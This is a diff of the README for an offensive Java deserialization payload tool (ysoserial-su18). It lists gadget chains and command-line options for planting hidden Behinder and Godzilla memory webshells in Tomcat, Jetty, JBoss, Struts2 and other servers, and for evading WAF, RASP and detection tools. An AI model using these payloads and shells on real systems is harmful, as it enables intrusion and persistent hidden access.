@@ -24,14 +24,8 @@ $ java -jar ysuserial-<version>-su18-all.jar
        _____.,-#%&$@%#&#~,._____
      _____.,[ 暖风熏得游人醉 ],._____
      _____.,[ 直把杭州作汴州 ],._____
-[root]#~  A Mind-Blowing Tool Collected By [ su18@javaweb.org ]
-[root]#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei
-[root]#~  AND OF COURSE TO THE All MIGHTY @frohoff
-[root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' [options]
+[root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p [command] [options]
 [root]#~  Available payload types:
-log4j:WARN No appenders could be found for logger (org.reflections.Reflections).
-log4j:WARN Please initialize the log4j system properly.
-log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.
      Payload                                     Authors                                Dependencies
      -------                                     -------                                ------------
      AspectJWeaver                               @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
@@ -52,8 +46,6 @@ log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more in
      CommonsBeanutils3                                                                  commons-beanutils:1.9.2, commons-collections:3.1
      CommonsBeanutils3183                                                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
      CommonsBeanutils4                                                                  commons-beanutils:1.9.2, commons-collections:3.1
-     CommonsBeanutilsAttrCompare                 @水滴                                    commons-beanutils:1.9.2
-     CommonsBeanutilsAttrCompare183              @SummerSec                             commons-beanutils:1.8.3
      CommonsBeanutilsObjectToStringComparator    @水滴                                    commons-beanutils:1.9.2, commons-lang3:3.10
      CommonsBeanutilsObjectToStringComparator183 @SummerSec                             commons-beanutils:1.8.3, commons-lang3:3.10
      CommonsBeanutilsPropertySource              @SummerSec                             commons-beanutils:1.9.2, log4j-core:2.17.1
@@ -61,6 +53,7 @@ log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more in
      CommonsCollections1                         @frohoff                               commons-collections:3.1
      CommonsCollections10                                                               commons-collections:3.2.1
      CommonsCollections11
+     CommonsCollections12                                                               commons-collections:3.2.1
      CommonsCollections2                         @frohoff                               commons-collections4:4.0
      CommonsCollections3                         @frohoff                               commons-collections:3.1
      CommonsCollections4                         @frohoff                               commons-collections4:4.0
@@ -72,6 +65,8 @@ log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more in
      CommonsCollections9                                                                commons-collections:3.2.1
      CommonsCollectionsK1                        @KORLR                                 commons-collections:<=3.2.1
      CommonsCollectionsK2                        @KORLR                                 commons-collections4:4.0
+     Fastjson1                                   @Y4tacker                              fastjson:1.2.48
+     Fastjson2                                   @Y4tacker                              fastjson2:2.0.26
      FileUpload1                                 @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
      Groovy1                                     @frohoff                               groovy:2.3.9
      Hibernate1                                  @mbechler                              hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1
@@ -104,35 +99,35 @@ log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more in
      Wicket1                                     @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
 
 
-usage: ysoserial-[version]-su18-all.jar [-ch <arg>] [-dcfp <arg>] [-dl <arg>] [-dt <arg>] [-et] [-f <arg>] [-g <arg>] [-gen] [-gzk <arg>]
-       [-h] [-hk <arg>] [-ht <arg>] [-hv <arg>] [-i] [-j] [-mcl] [-n <arg>] [-ncs] [-o] [-p <arg>] [-pw <arg>] [-u <arg>]
-       
- -g,--gadget <arg>                           Java deserialization gadget
- -p,--parameters <arg>                       Gadget parameters
- -u,--url <arg>                              MemoryShell binding url pattern,default [/version.txt]
- -pw,--password <arg>                        Behinder or Godzilla password,default [p@ssw0rd]
- -gzk,--godzilla-key <arg>                   Godzilla key,default [key]
- -hk,--header-key <arg>                      MemoryShell Header Check,Request Header Key,default [Referer]
- -hv,--header-value <arg>                    MemoryShell Header Check,Request Header Value,default [https://su18.org/]
+usage: ysoserial-[version]-su18-all.jar [-ch <arg>] [-dcfp <arg>] [-dl <arg>] [-dt <arg>] [-f <arg>] [-g <arg>] [-gen] [-gzk <arg>] [-h] [-hk <arg>]
+       [-ht <arg>] [-hv <arg>] [-i] [-mcl] [-n <arg>] [-ncs] [-o] [-p <arg>] [-pw <arg>] [-rh] [-u <arg>]
  -ch,--cmd-header <arg>                      Request Header which pass the command to Execute,default [X-Token-Data]
- -h,--hide-mem-shell                         Hide memory shell from detection tools (type 2 only support SpringControllerMS)
- -ht,--hide-type <arg>                       Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/
+ -dcfp,--define-class-from-parameter <arg>   Customize parameter name when using DefineClassFromParameter
+ -dl,--dirty-length <arg>                    Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2
+ -dt,--dirty-type <arg>                      Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in
+                                             Serialized Data
  -f,--file <arg>                             Write Output into FileOutputStream (Specified FileName)
+ -g,--gadget <arg>                           Java deserialization gadget
  -gen,--gen-mem-shell                        Write Memory Shell Class to File
+ -gzk,--godzilla-key <arg>                   Godzilla key,default [key]
+ -h,--hide-mem-shell                         Hide memory shell from detection tools (type 2 only support SpringControllerMS)
+ -hk,--header-key <arg>                      MemoryShell Header Check,Request Header Key,default [Referer]
+ -ht,--hide-type <arg>                       Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/ 3:Camouflaged ClassLoader
+ -hv,--header-value <arg>                    MemoryShell Header Check,Request Header Value,default [https://su18.org/]
  -i,--inherit                                Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)
- -j,--jboss                                  Using JBossObjectInputStream/ObjectOutputStream
  -mcl,--mozilla-class-loader                 Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil
  -n,--gen-mem-shell-name <arg>               Memory Shell Class File Name
  -ncs,--no-com-sun                           Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl
  -o,--obscure                                Using reflection to bypass RASP
- -dcfp,--define-class-from-parameter <arg>   Customize parameter name when using DefineClassFromParameter
- -dt,--dirty-type <arg>                      Using dirty data to bypass WAF，type: 1:Random Hashable Collections/2:LinkedList Nesting/3:TC_RESET in Serialized Data
- -dl,--dirty-length <arg>                    Length of dirty data when using type 1 or 3/Counts of Nesting loops when using type 2
- -et,--encrypted-transcoder                  Encode By EncryptedTranscoder
+ -p,--parameters <arg>                       Gadget parameters
+ -pw,--password <arg>                        Behinder or Godzilla password,default [p@ssw0rd]
+ -rh,--rhino                                 ScriptEngineManager Using Rhino Engine to eval JS
+ -u,--url <arg>                              MemoryShell binding url pattern,default [/version.txt]
 
-Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i
+
+Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser
 If you want your payload being extremely short，you could just use:
-java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
+java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' -i -f evil.ser
 ```
 
 # 利用方式
@@ -154,6 +149,8 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 - 命令 `EX-TomcatEcho`：Tomcat 命令执行回显
 - 命令 `EX-SpringEcho`：Spring 命令执行回显
 - 命令 `EX-JbossEcho`：Jboss 命令执行回显
+- 命令 `EX-JettyEcho`：Jboss 命令执行回显
+- 命令 `EX-Struts2Echo`：Jboss 命令执行回显
 
 解决 Shiro Header 头部过长问题：
 
@@ -167,6 +164,7 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 - 命令 `EX-MS-TFMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
 - 命令 `EX-MS-TFMSFromRequest-...`：通过在线程组中找 Request 向系统内植入 Tomcat Filter 型内存马
 - 命令 `EX-MS-TFMSFromThread-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
+- 命令 `EX-MS-TLMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
 - 命令 `EX-MS-TLMSFromThread-...`：通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
 - 命令 `EX-MS-TSMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
 - 命令 `EX-MS-TSMSFromRequest-...`：通过在线程组中找 Request 向系统内植入 Tomcat Servlet 型内存马
@@ -175,12 +173,14 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 - 命令 `EX-MS-JBSMSFromContext-...`：通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
 - 命令 `EX-MS-JFMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
 - 命令 `EX-MS-JSMSFromJMX-...`：利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
+- 命令 `EX-MS-JFMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Jetty Filter 型内存马
+- 命令 `EX-MS-JSMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Jetty Servlet 型内存马
 - 命令 `EX-MS-RFMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
 - 命令 `EX-MS-RSMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
 - 命令 `EX-MS-WSFMSFromThread-...`：通过线程类加载器获取指定上下文系统内植入 Websphere Filter 型内存马
 - 命令 `EX-MS-RMIBindTemplate-...`：RMI 型内存马
-
-目前支持的直打内存马的类型包括 Tomcat、Jetty、JBoss/Wildfly、Websphere、Resin、Spring。
+- 命令 `EX-MS-Struts2ActionMS-...`：Struts2 Action 型内存马
+- 命令 `EX-MS-JSFThreadLocalMS-...`：JSF ThreadLocal 内存马
 
 并可以通过关键字指定内存马的类型，如冰蝎内存马、哥斯拉 Base64 内存马、哥斯拉 RAW 内存马、CMD 命令回显马等，使用方法例子如下：
 
@@ -200,9 +200,9 @@ java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'
 
 - `EX-MS-RMIBindTemplate-1100-su18`: `CMD` 命令回显 RMI 内存马
 
-无文件落地的 Agent 型内存马，通过修改系统关键类字节码，植入内存马，无任何文件落地，全程在内存操作，能绕过多种防护和检测，使用方式 `EX-Agent-Lin/Win-Filter/Servlet-bx/gzraw/gz/cmd`，目前区分 Win/Lin 操作系统，并支持了 Servlet、Tomcat Filter 型内存马，将会持续更新一些 Hook 点，使用方式例如：
+无文件落地的 Agent 型内存马，通过修改系统关键类字节码，植入内存马，无任何文件落地，全程在内存操作，能绕过多种防护和检测，使用方式 `EX-Agent-Lin/Win-Filter/Servlet-bx/gzraw/gz/cmd`，目前区分 Win/Lin 操作系统，并支持了 Servlet、Filter 型内存马，将会持续更新一些 Hook 点，使用方式例如：
 
-- `EX-Agent-Lin-Filter-bx`：在 Linux 系统上对 Tomcat Filter 修改类字节码的冰蝎 Agent 型内存马
+- `EX-Agent-Lin-Filter-bx`：在 Linux 系统上对 FilterChain 修改类字节码的冰蝎 Agent 型内存马
 
 本工具支持的全部内存马经过测试可用，但实际受到中间件版本的限制，对于内存马的相关测试，可以参考项目 [https://github.com/su18/MemoryShell](https://github.com/su18/MemoryShell)
 
